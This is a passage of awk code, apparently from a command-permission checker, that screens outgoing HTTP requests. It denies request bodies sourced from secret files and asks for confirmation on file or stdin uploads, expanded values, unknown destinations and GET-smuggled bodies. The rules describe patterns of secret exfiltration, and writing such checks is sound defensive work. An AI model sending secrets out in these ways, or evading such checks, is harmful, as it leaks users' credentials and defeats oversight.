            } else if (val ~ /\$/) expand = 1
          }
        }
        if (tok ~ /\$/) expand = 1
        if (dest == "" && tok !~ /^-/) { h = url_host(tok); if (h != "") dest = h }
      }

      if (secret != "") { print "DENY request body is sourced from a secret file: " unmark(secret); exit }
      if (body && src == "stdin")       { print "ASK1 uploads piped stdin as a request body"; exit }
      else if (body && src != "")       { print "ASK1 uploads file \"" unmark(src) "\" as a request body"; exit }
      else if (body && inline) {
        if (expand)                     { print "ASK1 sends an expanded value as a request body"; exit }
        if (MAXCLASS >= 2 && !safe_host(dest)) { print "ASK2 sends an inline request body to " (dest == "" ? "an unparsed destination" : dest); exit }
      }
      else if (body && MAXCLASS >= 2 && !safe_host(dest)) { print "ASK2 sends a request body"; exit }
      else if (expand && MAXCLASS >= 3) { print "ASK3 an expansion rides in the request (possible GET-smuggled body)"; exit }
    }
  }
}
